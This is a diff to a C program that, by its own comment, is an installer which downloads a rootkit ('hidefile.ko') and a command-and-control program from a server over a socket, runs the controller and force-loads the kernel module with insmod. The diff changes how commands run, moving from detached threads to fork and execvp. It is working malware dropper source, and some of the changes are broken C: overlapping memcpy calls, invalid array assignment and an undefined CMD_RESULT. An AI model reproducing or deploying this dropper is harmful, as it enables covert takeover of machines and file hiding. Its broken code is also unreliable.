@@ -9,24 +9,22 @@
 #include <fcntl.h>
 #include <sys/shm.h>
 #include <errno.h>
-#include <pthread.h>
 
 
 #define BUFFER_SIZE 4096
 #define SP_PORT     8890
 #define SERVER_ADDR "127.0.0.1"
 char* ROOTKIT = "hidefile.ko";   
-//char* CCPROGRAM = "control.jar";  
+char* CCPROGRAM = "ccprogram";  
 char buf[BUFFER_SIZE];
 int sock_fd;
 
-static int readbuf(int conn, char* buf, int size);
-static int getIntFromBuf(char* buf, int offset);
+int readbuf(int conn, char* buf, int size);
+int getIntFromBuf(char* buf, int offset);
 
-static void threadexec(char** av);
-static int execcmd(char** args);
-static int obtain(char* filename);
-static int opensocket();
+int execcmd(char** args);
+int obtain(char* filename);
+int opensocket();
 
 /**
  * @brief This installer.c is a installer that download the rootkit from our server
@@ -35,18 +33,23 @@ static int opensocket();
 int main()
 {
     int rv;
+    char **argv;
     
     rv = obtain(CCPROGRAM);
-    if(rv == 0) execcmd({"/usr/bin/java", "-jar", CCPROGRAM, NULL});
+    memcpy(buf, "./", 2);
+    memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
+    argv = {buf, NULL};
+    if(rv == 0) execcmd(argv);
     
     rv = obtain(ROOTKIT);
-    if(rv == 0) execcmd({"/sbin/insmod", "-f", ROOTKIT, NULL});
+    argv = {"/sbin/insmod", "-f", ROOTKIT, NULL};
+    if(rv == 0) execcmd(argv);
     
     printf("Install success!\n");
     return 0;
 }
 
-static int opensocket(){
+int opensocket(){
     sock_fd = socket(AF_INET,SOCK_STREAM, 0);
     struct sockaddr_in servaddr;
     
@@ -62,7 +65,7 @@ static int opensocket(){
     } 
 }
 
-static int obtain(char* filename){
+int obtain(char* filename){
     FILE *fp;
     int filesize, chunk;
                     
@@ -97,7 +100,7 @@ static int obtain(char* filename){
     return 0;
 }
 
-static int readbuf(int conn, char* buf, int size){
+int readbuf(int conn, char* buf, int size){
     int cur = 0;
     while(cur < size){
         int cnt = recv(conn, buf + cur, size - cur, 0);
@@ -108,7 +111,7 @@ static int readbuf(int conn, char* buf, int size){
     return cur;
 }
 
-static int getIntFromBuf(char* buf, int offset){
+int getIntFromBuf(char* buf, int offset){
     int value;    
     value = (int) ( ((buf[offset] & 0xFF)<<24)  
             |((buf[offset+1] & 0xFF)<<16)  
@@ -117,20 +120,14 @@ static int getIntFromBuf(char* buf, int offset){
     return value;
 }
 
-static int execcmd(char** args){
-    pthread_t tid;
-    pthread_attr_t attr;
-    int rv;
+int execcmd(char** args){
+    int i, j;
     
-    pthread_attr_init(&attr);
-    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
-    rv=pthread_create(&tid, &attr, (void*)threadexec, args);
+    if((i=fork()) == 0){
+        freopen(CMD_RESULT, "w", stdout);
+        execvp(args[0], args); 
+    }
+    waitpid(i, &j, 0);
     
-    return rv;
-}
-
-static void threadexec(char** av){
-//    char *av[ ]={"/sbin", "insmod", "-f", modName};   
-    char *ep[ ]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};   
-    return execve(av[0], av, ep); 
+    return 0;
 }
